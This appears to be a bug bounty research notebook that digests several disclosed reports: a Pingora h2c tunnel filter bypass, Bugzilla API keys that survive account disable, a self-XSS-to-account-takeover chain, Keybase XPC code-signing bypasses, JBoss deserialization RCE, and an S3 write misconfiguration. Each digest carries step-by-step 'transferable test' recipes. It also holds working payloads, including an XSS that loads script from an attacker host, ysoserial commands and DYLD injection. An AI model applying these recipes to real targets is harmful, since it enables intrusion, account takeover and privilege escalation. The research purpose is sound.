SOURCE: https://hackerone.com/reports/3622877  2026-11-12
ROUTE: live `https://hackerone.com/reports/3622877.json` = HTTP 200 but `vulnerability_information` 0 chars (body withheld). ROUTE THAT WORKED: the report's own TEAM SUMMARY, fetched from the live `.json` `summaries[]` array this pass (quoted verbatim below); the ajaysenr mirror `by-year/2026.md` supplied the listing row. Metadata: Cloudflare Public Bug Bounty, "HTTP Request Smuggling via Unsanitized Hop-by-Hop Headers", submitted 2026-03-23, disclosed 2026-09-14, resolved, H1 severity high, $1,500, 31 votes; team's own retitle (verbatim): "a more fitting title would be Request Inspection Bypass via Unintended h2c Upgrade Tunneling; there was no request smuggling desync enabled."
STATUS: UNVERIFIED (not reproduced — no Pingora 0.8.x + h2c upstream pair stood up; mechanism quoted from the team summary)
CLASS: proxy filter bypass / request-inspection bypass via HTTP/1 `Upgrade: h2c` TUNNELING — after the connection upgrades to HTTP/2 cleartext with the upstream, subsequent requests ride a connection the proxy no longer inspects per-request (NOT smuggling; the team confirms "there was no request smuggling desync enabled"). CWE-444-adjacent (proxy interpretation mismatch), reported as Improper Access Control.
CORE METHOD:
  1. THE CARRIER (team summary verbatim): "Pingora could forward h2c upgrade requests in HTTP/1 to upstream servers" — the proxy passes the `Upgrade: h2c` negotiation to the backend instead of restricting which upgrades are forwarded.
  2. THE BYPASS (verbatim): "allowing subsequent h2c requests over the upgraded connection to bypass request-level filters applied by the proxy" — WAF/path/header checks are evaluated PER REQUEST on the proxy's HTTP/1 view; inside the tunnel there is no per-request view to filter.
  3. THE FIX (verbatim): "Pingora 0.9.0 restricts HTTP/1 upgrades to WebSocket by default, addressing this issue. Users with h2c-compatible upstreams should upgrade to that version or later."
DETECTION SIGNAL: a proxy/gateway/WAF performing per-request filtering in front of an upstream that speaks h2c (gRPC/gRPC-web backends, Envoy/h2 cleartext, Java/Go h2 services); the proxy forwards arbitrary `Upgrade` values (anything other than `websocket` is the tell); a `101` response with `Upgrade: h2c` to an HTTP/1 request carrying `Connection: Upgrade, HTTP2-Settings` + `Upgrade: h2c`.
CHAIN: attacker sends a request through the filtered proxy with `Upgrade: h2c` (+ `HTTP2-Settings`) -> the proxy forwards the upgrade (Pingora <0.9.0) and the upstream accepts -> the connection is now an h2c tunnel to the upstream -> every subsequent request sent over the tunnel skips the proxy's per-request filters (WAF rules, path blocks, header checks, edge auth gates) -> whatever those filters protected becomes reachable at the upstream unfiltered (program rated High; the specific ceiling is upstream-dependent). Per doctrine §8: precondition = an h2c-capable upstream behind a per-request-filtering proxy that forwards upgrades; gain = reaching previously filtered/blocked requests unfiltered.
TRANSFERABLE TEST: against any edge-filtered request (blocked path/header): open a raw TCP connection and send `GET / HTTP/1.1` / `Host: …` / `Connection: Upgrade, HTTP2-Settings` / `Upgrade: h2c` / `HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA`; if the upstream answers `101 Switching Protocols` with `Upgrade: h2c`, continue the connection with the HTTP/2 client preface (`PRI * HTTP/2.0`) and re-issue the previously blocked request INSIDE the tunnel; if it reaches the backend while the same request is blocked outside, the per-request filter is bypassed. Compare against a proxy that whitelists only `Upgrade: websocket` (post-0.9.0 Pingora refuses). Rule: **per-request proxy filters stop existing the moment a connection becomes a tunnel — a forwarded `Upgrade: h2c` turns a filtered path into an uninspected one.**
DEDUPE/DELTA: `3622877`, `h2c`, `Pingora`, `HTTP2-Settings`, `hop-by-hop`, `upgrade tunnel` = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: the request-smuggling (CL.TE/TE.CL desync) playbook entries — the team explicitly states this is NOT a desync; §17.193 (TLS session-ticket resumption state not isolated per vhost — session-layer state bypass at TLS, not an application-layer filter tunnel); the WebSocket cross-service/CSWSH material. NEW DELTA: the upgrade-tunnel route to filter evasion. New general method -> §17.610.
FRESHNESS: submitted 2026-03-23 / disclosed 2026-09-14 — INSIDE the preferred 6-12 month window. The method (connection-level upgrade tunnel vs per-request inspection) is protocol-level and re-detectable on any upgrade-forwarding proxy in front of an h2c upstream.

SOURCE: https://hackerone.com/reports/4000084  2026-11-12
ROUTE: live `https://hackerone.com/reports/4000084.json` = HTTP 200 but `vulnerability_information` 0 chars (body withheld). ROUTE THAT WORKED: the live `.json` `summaries[]` array — BOTH the team summary and the researcher summary are public there and quoted below (the researcher summary is the richest source). Metadata: Mozilla (BMO Bugzilla), "A disabled account's API key still works on BMO's Mojolicious /rest/ routes, including for security-group bugs filed after the disable", submitted 2026-09-05, disclosed 2026-10-26, resolved, H1 severity high, $4,000, weakness Improper Authentication; fix mozilla-bteam/bmo#2757 merged 2026-09-23, shipped release-20260923.1; upstream `bugzilla/bugzilla` not affected (BMO-specific login helper).
STATUS: UNVERIFIED (not reproduced — no BMO/Bugzilla instance exercised; steps quoted from the public summaries)
CLASS: authentication state-check inconsistency across PARALLEL AUTH IMPLEMENTATIONS — the account-lifecycle state (`is_enabled`, password-change-required) is validated in one auth stack but not in another, and long-lived credentials (API keys) + group memberships survive the state change (CWE-287 / CWE-613).
CORE METHOD:
  1. TWO STACKS (researcher summary verbatim): "BMO had two authentication paths, and only one of them checked whether an account was still enabled. The legacy stack (`rest.cgi` and the web UI) refused a disabled account. The Mojolicious `bugzilla.login` helper serving the native /rest/ V1 routes never called `is_enabled`." Affected native routes named: `/rest/search/*`, `/rest/component/*`.
  2. WHAT SURVIVES A DISABLE (verbatim): "Disabling an account deleted its login cookies but left its API keys and group memberships in place. So a key minted before the disable kept working on the native routes."
  3. THE READ (verbatim): "Its owner could go on reading security-restricted bugs, including ones filed after the disable".
  4. THE WRITE ESCALATION (verbatim): "could still write through `PUT /rest/component`. Setting a component's triage owner or CC list that way handed restricted bugs to a second account that had never been in the security group."
  5. SAME DEFECT, SECOND STATE (verbatim): "An account flagged to change its password, without being disabled, behaved the same way." — the state-check gap covers more than disable.
  6. WHO (verbatim): "anyone whose account was shut off while they still held a key: offboarded staff, a banned user, or someone who closed their own account."
DETECTION SIGNAL: a product with MORE THAN ONE login implementation (legacy + new API; web + mobile BFF; cookie + API key/PAT/OAuth client) where account state transitions (disable, ban, offboard, password-change-required) delete sessions/cookies but not long-lived tokens, and where token authentication never re-checks account status (state checks only at interactive login); role/group memberships cached at token mint time. TELL: two stacks with different behavior for the SAME credential after a state change.
CHAIN: an account is disabled/banned/offboarded while holding a key minted earlier (primitive: credential survives the state change) -> the new auth stack authenticates the key without checking `is_enabled` (bypass) -> the ex-user reads security-restricted bugs including ones filed AFTER the disable (sensitive data) -> `PUT /rest/component` writes the triage owner/CC of a protected component to an attacker-controlled second account (escalation) -> restricted bugs flow to an account that was never in the security group (persistent unauthorized access; program rated High, $4,000). Per doctrine §8: precondition = held a valid API key before the account state change (offboarded staff / banned user / closed account); gain = continued read of security-restricted data + a write that grants a fresh account access to it.
TRANSFERABLE TEST: wherever parallel auth paths exist: (1) while logged in, collect one credential of EACH type (cookie, API key, PAT, OAuth refresh token, service account key); (2) trigger the account state change (disable/ban/close/password-reset-required); (3) replay every API surface (legacy AND new) with every credential — any 200 means the state check lives in only one stack; (4) escalate with the surviving credential through WRITE verbs on ACL-ish fields (owners, CC, members, roles, triage defaults) to hand protected objects to a clean second account; (5) repeat for each state change (disable is not the only one). Rule: **account state is only as enforced as its least-checked auth stack — test every credential type against every stack after every state change.**
DEDUPE/DELTA: `4000084`, `is_enabled`, `bugzilla`, `BMO`, `rest.cgi`, `Mojolicious` = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: #386997 (a private program's policy page readable after LEAVING the program — "revocation enforced in the UI, never re-checked on the read path"; ONE stack's read path, no credential survival, no write escalation) — this entry is two AUTH STACKS disagreeing on the auth check itself, with a long-lived KEY surviving the state change and a WRITE leg; §17.158 (GitLab pull-mirror post-removal write via an unchecked `mirror_user_id` — a missed-id write, not state validation). CROSS-REFERENCED CARRIER, same family, NOT separately recorded: HackerOne #3572848 (Nextcloud `user_oidc`, "Group restriction bypass via bearer token", disclosed 2026-05-21 — `SETTING_RESTRICT_LOGIN_TO_GROUPS` enforced in the browser OIDC flow but not in bearer-token validation `Backend::getCurrentUserId`; team summary: "Exploitation requires possession of the OAuth client_secret for the OIDC client configuration… limiting practical exploitability"). NEW DELTA: the auth-implementation inconsistency matrix (which stack checks which state, which credential survives which transition). New general method -> §17.611.
FRESHNESS: submitted 2026-09-05 / disclosed 2026-10-26 — INSIDE the preferred 6-12 month window. The method (parallel auth stacks + credential survival across state changes) is architecture-level and re-detectable on any product with legacy+new login paths.

SOURCE: https://script.hashnode.dev/self-xss-to-ato-via-site-features  2026-11-12
ROUTE: surfaced by the assigned PentesterLand source — the writeups index is DataTables over `https://pentester.land/writeups.json` (found in the page source after `/list-of-write-ups` 404'd); the row (tags Self-XSS + Account takeover, PublicationDate 2024-09-08, AddedDate 2024-09-18) links this article; full body read this pass via `web_extract` on the article URL. The writeup names no program ("a public program"), so no program+report id is claimed.
STATUS: UNVERIFIED (not reproduced — no target exercised; the final session-exfil mechanics are the reporter's claim, noted below)
CLASS: self-XSS (doctrine §2(a) primitive) escalated to ATO via FORCED LOGIN (a magic/"quick login" link authenticates whoever OPENS it, landing the victim inside the ATTACKER's account on the page where the stored payload fires) + the site's own OAuth login driven from the payload in the victim's browser (CWE-79 chained with login-CSRF semantics).
CORE METHOD:
  1. THE SELF-XSS (article verbatim): the payload `<img/src/onerror='alert(1)'>` goes into the profile name field; "On the profile page, everything was secure, and characters like quotes, `>`, and `<` were encoded" but ANOTHER page re-renders the name unencoded — "I finally landed on one where my payload executed!" (site is Next.js). Self-XSS firing only on a specific page is the primitive.
  2. THE DELIVERY — forced login (verbatim): the site's "Quick login" method "sends a link to your email, allowing you to log in without a username and password. The link is valid for 10 minutes"; the attacker triggers it for their OWN account (`POST /api/multipass/account/quick_logins/login_token` with their account's email — request shape quoted in the writeup) and delivers the link to the victim — "the link redirected me to the landing page.. Bingo" — i.e. whoever opens the link is logged into the ACCOUNT THAT REQUESTED IT and lands where the stored payload runs.
  3. THE PAYLOAD (verbatim): `<img/src/onerror='s=document.createElement("script");s.src="https://myserver/script.js";document.body.append(s)'>` — the self-XSS becomes arbitrary attacker script running while the victim sits in the attacker's account.
  4. THE ATO LEG (article): the script opens the site's own OAuth ("login with Gmail"/FB) flow in a child window; "If they are already logged in, they will log in without any clicks" — zero-interaction — and the OAuth callback returns to the site's own origin, so the attacker's script operates in the same browser as the victim's freshly established real session ("I can get their cookies"). HONESTY: the exact cookie/session exfil mechanics are asserted by the reporter, not demonstrated in the text; what IS shown is the chain composition and the delivery automation.
  5. THE AUTOMATION (verbatim pieces): the delivery page calls `revokeLink()` (requests the quick-login link), waits 5s, then a Google Apps Script + Gmail API reader extracts the link from the attacker's mailbox (`preg_match('/https:\/\/blabla\.example\.com\/auth\/quick\/callback.*"/', ...)`) and redirects the victim — self-serve delivery inside the 10-minute window.
DETECTION SIGNAL: a login method that authenticates whoever OPENS a link sent to the account's email (quick-login/magic-link/"login without password") and lands them on a page rendering user-stored content; self-XSS that fires only on SOME pages (a profile field re-rendered unencoded elsewhere); an OAuth "continue with Google/Facebook" button reachable from a page where attacker script can run; the composition: forced-login link + stored payload on the landing path + SSO button.
CHAIN: self-XSS in the attacker's own profile (normally never-reported, doctrine §2(a)) -> the landing page re-renders it unencoded, so it executes for ANY viewer of that page -> the attacker's quick-login magic link forces the VICTIM into the attacker's account on that page (bypass: the link authenticates the opener; 10-minute validity is enough for a click) -> payload loads attacker JS -> the JS drives the site's own OAuth login in-window; the victim being logged into Google makes it zero-click -> the victim's real session is established in a browser already running attacker script -> read/change the victim's account = ATO (the class the doctrine reports). Per doctrine §8: precondition = victim opens the delivered link (and is logged into Google, or one click on the OAuth button); gain = the victim's full account session under attacker script.
TRANSFERABLE TEST: on any site with magic-link login + self-XSS: (1) store a benign self-XSS and find the page where it fires unencoded; (2) request the site's own magic/quick-login link for YOUR account and get the victim to open it (this is the delivery that puts the victim in your account); (3) from the payload, drive the site's SSO button in a window; (4) once the victim's real session exists in that browser, script performs `fetch(..., {credentials:'include'})` against the account's own API (change email/password, read data) and exfil via your listener. Rule: **self-XSS is only "self" while the victim is not in your account — a forced-login magic link puts them there, and the site's own OAuth button turns your payload into their session.**
DEDUPE/DELTA: `quick_login`, `quick login`, `login CSRF`, `forced login`, `multipass` = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: ledger ~1560 ("With any XSS (reflected, stored, DOM, or self-XSS chained to CSRF), issue the email-change request" — the EMAIL-CHANGE consumption of a chained XSS; no forced-login delivery leg); §17.389 (Cloudflare #3423950 self-XSS chained with COOKIE TOSSING — a different delivery primitive); the magic-link token-channel material (leak/replay of the LINK itself — here the link is used exactly as designed, as a forced-login DELIVERY); §17.46 (initiate response returns the token — different defect). NEW DELTA: the forced-login-magic-link delivery + OAuth-child-window session legs that turn self-XSS into ATO. New general method -> §17.612.
FRESHNESS: published 2024-09-08 — OUTSIDE the preferred 6-12 month window (~14 months); read because it was the newest in-class item the assigned PentesterLand source surfaced (that index is stale since 2024-09). The method (forced login + self-XSS + OAuth composition) is flow-design-level and re-detectable on any site with magic-link login.

STATUS: UNVERIFIED (not reproduced — no macOS Keybase helper/XPC pair was stood up this pass; every quote below is verbatim from the fetched report body; the body names its own PoC sources `poc1.m` / `injected.m` and the earlier report #397478).
CLASS: privilege escalation (local, macOS) — three bypasses (plus one possible) of the CODE-SIGNING CLIENT CHECK on a root XPC helper: an INCOMPLETE SECURITY FIX for the earlier "privileged helper lacks of validation so any applications can abuse it to gain root privilege" (#397478). The fix authenticates the connecting process's SIGNING IDENTITY; every bypass defeats exactly that (TOCTOU self-replacement, PID-reuse race, code injection into the blessed binary).
CORE METHOD:
  1. THE SURFACE + THE TEST SIGNAL (report verbatim): the root helper (Keybase.Helper, MPMessagePack XPC) only accepts clients passing a code-sign check (allowlisted identifiers `keybase.Installer` / `keybase.Keybase`); the PoC sends a simple `xpc_dictionary` — "If the code sign check works, I should received a 'connection interrupt' error. To prove that I have bypassed the check, I will get a 'Unable to read object' reply (that the MPMessagePack has received the message but doesn't recognize its format)."
  2. BYPASS 1 — TOCTOU SELF-REPLACEMENT (report verbatim): "Unlike Windows, macOS does not lock the executable that being executed. So between my evil process's creation and the XPC, there's a time window that I can simply replace my self with a valid executable. Since the original binary has `@rpath` dependencies, I have to copy the whole app bundle (not the single executable)." The check validates the process image at check time — which by then IS the valid signed bundle.
  3. BYPASS 2 — PID-REUSE RACE (report verbatim): the check validates the signature of the process WITH A GIVEN PID; the report quotes the MPMessagePack comment ("The OS's process ID space is relatively small, which means that process IDs are commonly reused... there's no public API to get an audit token from an XPC connection") and continues: "on macOS, pid can be reuse. You can even replace current executable to a different process with fork() / posix_spawn() while keeping the old pid. For loop for about 8 times you can trigger the race condition." Console evidence: `process:keybase.Helper` shows "Failed to pass code requirement: ... Binary failed code requirement" interleaved with connections that PASS. (Variant of Ian Beer, Project Zero issue 1223.)
  4. BYPASS 3 — `DYLD_INSERT_LIBRARIES` INTO THE BLESSED BINARY (report verbatim): "`DYLD_INSERT_LIBRARIES` can inject evil payload to valid signed process, without touching its code signature. To prevent this attack, you can either add LibraryValidation to whitelisted binary (I strongly recommend this) or add any custom Entitlement to the code signature. Addictionaly, XPC has the built-in support for checking entitlement." Attacker code runs INSIDE a process whose signature passes.
  5. BYPASS 4 (possible; the report flags its own doubt) — a whitelisted INTERPRETER loads untrusted code: Electron's `--inspect=[port]` / `--inspect-brk=[port]` exposes the debug protocol on localhost over WebSocket, `process.dlopen` loads a library; verdict verbatim: "We should NEVER trust such script language interpreters like Electron, node.js... Library Validation can prevent them from dylib hijack, but some interpreter also have the ablity to run shellcode. So just block them."
  6. THE FIX CHECKLIST (report verbatim): use `audit_token_t` not PID ("PID can be reused, not to mention path. Don't trust it."); add the Library Validation flag to whitelisted clients; add NEW custom entitlements (any name not starting with `com.apple.private`) to the code-signing requirements so old signed binaries cannot be replayed.
DETECTION SIGNAL: a root LaunchDaemon/XPC helper whose connection check runs `SecStaticCodeCheckValidity`-style code-signing checks keyed to PID or launch path instead of `audit_token_t` + a SecCode requirement; a signer-IDENTITY allowlist with no LibraryValidation and no custom entitlements; whitelisted clients that are Electron/Node/Lua interpreters; and the practical tell — the helper's reply flipping between "connection interrupt" (check active) and "Unable to read object" (check bypassed) when the same message is sent from different process shapes.
CHAIN: unprivileged local user runs their own binary (primitive: any local code, no admin rights) -> the helper's client check should stop it, but (bypass) the process replaces its own image with a valid signed bundle between spawn and connect / a PID-reuse race makes the check validate a different process / `DYLD_INSERT_LIBRARIES` runs the payload inside the allowlisted signed client -> the XPC message is accepted and the privileged helper performs attacker-directed work as ROOT (report impact verbatim: "An attacker that can execute arbitrary code in normal user can be elevated to root privilege"). Per doctrine §8: precondition = local code execution as a normal user, no victim interaction; gain = root on the machine.
TRANSFERABLE TEST: on any macOS privileged helper/installer: (1) class-dump the daemon and read the connection check — PID/path-keyed (`processIdentifier`, `kSecGuestAttributePid`, signature-of-launch-path) vs `audit_token`+SecCode; (2) send one benign XPC message from a test binary and record the error ("connection interrupt" = check active); (3) A/B the three bypasses: self-replace the test binary with a copy of a VALID signed client bundle (whole bundle when `@rpath`) between spawn and connect; fork/spawn-loop to reclaim a just-exited legitimate client's PID (`posix_spawn(POSIX_SPAWN_SETEXEC)` trick) while connecting; set `DYLD_INSERT_LIBRARIES=<evil.dylib>` on the WHITELISTED signed client and watch whether the helper accepts the connection; (4) repeat with the allowlisted client launched under `--inspect`. Rule: **a code-signing identity check on an XPC client proves WHICH binary is signed, not WHAT CODE runs inside the process — race the self-replace, reuse the PID, or inject a dylib into the blessed binary; the fix is audit_token + LibraryValidation + custom entitlements, and interpreters must never be allowlisted.**
DEDUPE/DELTA: `470003`, `0xcccc`, `MPMessagePack`, `SecStaticCodeCheckValidity`, `DYLD_INSERT_LIBRARIES`, `LibraryValidation`, `connection interrupt`, `Unable to read object` = 0 hits across the three write targets at read time. Related-but-distinct REVIEWED and NOT re-recorded: §17.182 (Keybase KB004 group #473252/#471739/#470398 — caller-supplied SOURCE PATH installed with caller ownership + signature-check-then-launch TOCTOU via SYMLINK SWAP; those legs are the INSTALL/launch path, whereas this report's surface is the XPC CONNECTION check and its bypass 1 is self-replacement of the process image, not a symlink), §17.532 (OneDrive — PID-based XPC client validation via `kSecGuestAttributePid` -> PID-reuse race; "PID is not an authenticator") and §17.483/#485407 (Keybase "From nobody to somebody" — `--app-path` symlink rewrite past a path guard). BYPASS 2 (PID reuse) is an instance of §17.532's method and is CROSS-REFERENCED, not re-recorded as new. NEW DELTA: the identity-check-vs-code-integrity gap — `DYLD_INSERT_LIBRARIES` injection into the allowlisted signed client (fix = LibraryValidation + custom entitlements), the TOCTOU self-replace variant (macOS does not lock the running image), "never allowlist an interpreter", and the connection-interrupt / unable-to-read-object A/B signal for testing helper checks. New general method -> §17.613.
FRESHNESS: disclosed 2019-01-31 (its subject is the fix for #397478) — OUTSIDE the preferred 6-12 month window (~7 years); read because assigned. The method (identity check ≠ code integrity on privileged helpers; audit_token > PID) is platform-API-level and re-detectable on every macOS privileged-helper surface.

SOURCE: https://hackerone.com/reports/153026  2026-11-12
ROUTE: live `https://hackerone.com/reports/153026.json` = HTTP 200, `visibility: full`, `vulnerability_information` 1,739 chars read IN FULL. Metadata: Starbucks, "Java Deserialization RCE via JBoss JMXInvokerServlet/EJBInvokerServlet on card.starbucks.in", reporter `meals`, submitted 2016-07-21, disclosed 2017-02-03, weakness Code Injection, resolved. (Same host `card.starbucks.in` as the batch-166 #221294 entry — a DIFFERENT report on the sibling JBoss servlets.)
STATUS: UNVERIFIED (not reproduced — no JBoss host was exercised this pass; every quote below is verbatim from the fetched report body).
CLASS: insecure deserialization -> RCE (blind, egress-filtered) — JBoss AS 4.x's unauthenticated `/invoker/{EJB,JMX}InvokerServlet` deserializes the raw POST body (MarshalledInvocation) into a ysoserial gadget; the report's own contribution is the BLIND CONFIRMATION ORACLE for hosts where egress filtering kills reverse shells and OAST: an in-band FILE-EXISTENCE ERROR-TEXT differential (CWE-502; error-message oracle CWE-209).
CORE METHOD:
  1. ENTRY POINTS (report verbatim): `https://card.starbucks.in/invoker/EJBInvokerServlet` and `https://card.starbucks.in/invoker/JMXInvokerServlet`.
  2. THE REQUEST (report verbatim): `java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'cmd.exe' > serialdata`, then a Burp Repeater tab: `POST /invoker/EJBInvokerServlet HTTP/1.1` / `Host: card.starbucks.in` / `ContentType: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation` / `Content-Length: 0` — "Then right click an select 'Paste from file'" to paste the serialized gadget as the body.
  3. THE ORACLE (the report's core teaching; context verbatim: "I think due to some egress filtering on the box I've been having issues getting a shell to run"): search the RESPONSE for "cannot find". Verbatim: "You will notice I am searching for the string 'cannot find' in the response tab. If a file is not found on the windows host it will return saying 'The system cannot find the file specified' as well as another variation of that. Since the first request is for cmd.exe which IS found on the system this error is not present. This can also be verified by running telnet, ftp, calc.exe." The A/B arm: `java -jar ysoserial... CommonsCollections1 'fakefile.exe' > serialdata` returns "The system cannot find the file specified" (report: "The following will produce a 'The system cannot find the file specified' error") — "This is proving that files are being run on the system."
DETECTION SIGNAL: a JBoss AS 4.x/EAP host answering on `/invoker/EJBInvokerServlet` / `/invoker/JMXInvokerServlet` (siblings: `/invoker/readonly`, `/jmx-console/HtmlAdaptor`, `/web-console/Invoker`, `/jbossmq-httpil/HTTPServerILServlet`); a response to a serialized POST whose ERROR TEXT tracks the payload's target path; the A/B tell — an EXISTING executable (`cmd.exe`, `telnet`, `ftp`, `calc.exe`) vs an INVENTED name (`fakefile.exe`) flips "The system cannot find the file specified" in and out of the response while OAST sees nothing.
CHAIN: unauthenticated POST of a ysoserial CommonsCollections gadget to the invoker servlet (primitive: no auth + no class filter) -> gadget executes during deserialization (escalation: code execution as the JBoss service account on the production card host) -> when egress filtering kills shells/OAST the FILE-EXISTENCE A/B proves execution IN-BAND through the response text -> follow-on commands (file read, exfil, reverse shell once an egress path is found) reach the doctrine's P1 RCE ceiling. Per doctrine §8: precondition = network reach to the invoker servlet (no auth, no user interaction); gain = command execution on the Windows host behind the card site.
TRANSFERABLE TEST: on every JBoss/EAP host: (1) `POST /invoker/EJBInvokerServlet` (and `/invoker/JMXInvokerServlet`) with `Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation` and a ysoserial CommonsCollections gadget as raw body; (2) when no OAST callback and no reverse shell returns (egress filtering), A/B two payloads whose commands name an EXISTING executable vs an INVENTED one (`cmd.exe` vs `fakefile.exe`; or `type C:\Windows\win.ini` vs `type C:\nope.txt`) and DIFF the response error text — a stable "cannot find the file"-style error that flips with the A/B is in-band proof the launch/deserialization executed; (3) confirm with one benign step and record the A/B pair as the PoC. Rule: **when OAST dies but the response carries the failed-launch error text, an existence A/B is a blind-execution oracle — the application's own error stream is the exfil channel.**
DEDUPE/DELTA: `153026`, `meals`, `MarshalledInvocation`, `fakefile`, "cannot find the file specified" = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: the batch-166 #221294 entry (SAME target host; JBossMQ `/jbossmq-httpil/HTTPServerILServlet` + `application/octet-stream` + CommonsCollections5/6 -> `ClassCastException -> HTTPILRequest`; its DETECTION SIGNAL already names `/invoker/JMXInvokerServlet` and `/invoker/EJBInvokerServlet` as sibling POST targets, and its DEDUPE states "The general 'Java deserialization of untrusted input -> RCE' method is already owned") — the CLASS and the endpoint family are cross-referenced, NOT re-recorded; the playbook's "Command-injection differential templates" confirm via OAST / time / output-REFLECTED-AS-TEXT only (§17.607's own dedupe names exactly those three channels); the LFI payloads "existence/missing differential" oracle (Bugbountyskills path-traversal payloads) and the XXE file-existence oracle (ledger ~10498) infer FILE EXISTENCE FROM A READ SINK — never execution from a launch error. NEW DELTA: the exact invoker-servlet request shape (`ContentType: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation` + "Paste from file") and the blind file-existence ERROR-TEXT differential as an execution oracle when egress filtering kills OAST and shells. New general method (the ORACLE; the sink is owned) -> §17.614.
FRESHNESS: submitted 2016-07-21 / disclosed 2017-02-03 — OUTSIDE the preferred 6-12 month window (~9 years); read because assigned. The method (blind execution proof via error-text A/B under egress filtering) is transport-agnostic and re-detectable on any blind-exec sink.

SOURCE: https://hackerone.com/reports/128088  2026-11-12
ROUTE: live `https://hackerone.com/reports/128088.json` = HTTP 200, `visibility: full`, `vulnerability_information` 1,248 chars read IN FULL. Metadata: HackerOne, "AWS S3 bucket writeable for authenticated aws users", reporter `yaworsk` (Peter Yaworski), submitted 2016-04-04, disclosed 2016-04-05, weakness Improper Authentication - Generic, resolved. (The sibling bucket's name is redacted in the body.)
STATUS: UNVERIFIED (not reproduced — no bucket was enumerated or written this pass; every quote below is verbatim from the fetched report body).
CLASS: cloud storage misconfiguration with demonstrated impact — an S3 bucket in the org's namespace grants `s3:PutObject` to ANY authenticated AWS principal (the "Any AWS Authenticated User" grant / AuthenticatedUsers group), discovered by SIBLING-NAME enumeration around a known bucket (CWE-732; supply-chain/business-logic leg).
CORE METHOD:
  1. THE RECON (report verbatim): "I know that hackerone-attachments is used for file uploads on reports and so I did a quick scan for similar buckets and found ████████" — sibling-name enumeration around a KNOWN bucket name.
  2. THE WRITE TEST (report verbatim): with the AWS CLI as an ordinary AWS account — against the legit bucket: "move failed: ./test.txt to s3://hackerone-attachements/test.txt A client error (AccessDenied) occurred when calling the PutObject operation: Access Denied." Against the sibling: "move: ./test.txt to s3://████████/test.txt" — the PUT SUCCEEDS.
  3. THE SHAPE OF THE MISCONFIG (report verbatim): "a good thing is the bucket is not publicly readable and the file appears private by default after being written" — the flaw is the WRITE grant to all AWS-authenticated principals, not anonymous read.
  4. THE IMPACT (report verbatim): "the security issue would be someone writing something malicious and someone on your team unknowingly opening it."
DETECTION SIGNAL: a known bucket name anywhere in the org's asset set (upload/attachment/CDN URLs, JS, policies) and sibling buckets reachable by name mutation (typos, hyphen/underscore, `-prod`/`-staging`, pluralization); `aws s3 cp test.txt s3://<candidate>/` from an UNRELATED AWS account succeeding while `--no-sign-request` reads fail; the canonical grant to `http://acs.amazonaws.com/groups/global/AuthenticatedUsers` ("Any AWS Authenticated User" in the IAM console).
CHAIN: attacker registers any AWS account (primitive: free, zero trust) -> sibling-name enumeration finds a bucket in the org's namespace (primitive: bucket names are guessable) -> `PutObject` succeeds because the grant is to ALL authenticated AWS users (bypass: the org meant "our AWS account"; the policy says "any AWS account") -> arbitrary objects planted in storage the org's users/pipeline trust (escalation: the report's own impact — "someone writing something malicious and someone on your team unknowingly opening it") -> escalations to TEST on other targets: if the bucket backs an upload/attachment/CDN surface, planted HTML/SVG/JS served from the org's bucket domain is stored XSS on a first-party origin; planted artifacts consumed by CI/CD or staff are a supply-chain write. Per doctrine §8: precondition = any AWS account + bucket-name knowledge; gain = arbitrary write into org-trusted storage (integrity impact).
TRANSFERABLE TEST: (1) collect every known bucket name in scope (attachment/CDN/upload URLs) and enumerate SIBLINGS by name mutation; (2) from an UNRELATED free-tier AWS account run `aws s3 cp ./canary.txt s3://<candidate>/canary.txt` — success = world-authenticated write; (3) separately map the read side with `aws s3 ls s3://<bucket> --no-sign-request` and `GET https://<bucket>.s3.amazonaws.com/?list-type=2`; (4) if any consumer (web app, CDN, pipeline, staff workflow) serves/opens objects from that bucket, plant one benign marker object and trace where it renders — the chain's impact lives in the consumer. Rule: **test buckets with an AUTHENTICATED foreign account, not just anonymous — "Any AWS Authenticated User" is a write grant to everyone with an AWS login, and sibling names are how you find it.**
DEDUPE/DELTA: `128088`, `hackerone-attachments`, `AuthenticatedUsers`, `PutObject`, "Any AWS Authenticated" = 0 hits as a WRITE-side technique across the three write targets (the 1 `aws s3 cp` hit is §17.548 / ledger ~16222 = `aws s3 ls` LIST/READ per-prefix probing). Related-but-distinct REVIEWED and NOT re-recorded: §17.548 (bucket policies evaluated PER-PREFIX — LIST/READ enumeration when the root is locked) and the recorded S3 material — #93691 presigned-POST policy prefix limits, Shopify Ping public READ of user images, §17.377 / #1406335 dangling-CNAME-to-DELETED-bucket subdomain takeover, §17.537 + ledger ~16002 APK-harvested bucket names -> anonymous LIST/READ — all READ-side or claim-side; none records the AuthenticatedUsers WRITE grant, the sibling-name scan, or the foreign-account `PutObject` probe. The reporter `yaworsk`'s other recorded reports (#327088 program-metrics JSON, #1091303 Shopify POS PINs) are unrelated. NEW DELTA: the any-AWS-account write grant as a class + sibling-bucket name-mutation discovery + the authenticated (not anonymous) write probe. New general method -> §17.615.
FRESHNESS: submitted 2016-04-04 / disclosed 2016-04-05 — OUTSIDE the preferred 6-12 month window (~10 years); read because assigned. The method (AuthenticatedUsers write grants + sibling-name enumeration) is cloud-policy-level and re-detectable on any org with S3 assets.

SOURCE: https://hackerone.com/reports/2633988  2026-11-12
ROUTE: live `https://hackerone.com/reports/2633988.json` = HTTP 200, `visibility: full`, `vulnerability_information` 1,927 chars read IN FULL. Metadata: U.S. Dept Of Defense, "DoD workstation exposed to internet via TinyPilot KVM with no authentication", reporter `socpuppet`, submitted 2024-07-31, disclosed 2024-08-16, weakness Improper Access Control - Generic, resolved.
STATUS: UNVERIFIED (not reproduced — no KVM device was touched this pass; the reporter themselves kept interaction to one screenshot ("I did **not** interact with the device at all. I immediately closed the connection after taking the screenshot attached to file this report."); every quote below is verbatim from the fetched report body).
CLASS: BAC / admin-internal panel access — an internet-exposed IP-KVM (TinyPilot) web interface with NO authentication = live screen view + full mouse/keyboard control of the connected workstation (missing authentication on a critical function).
CORE METHOD:
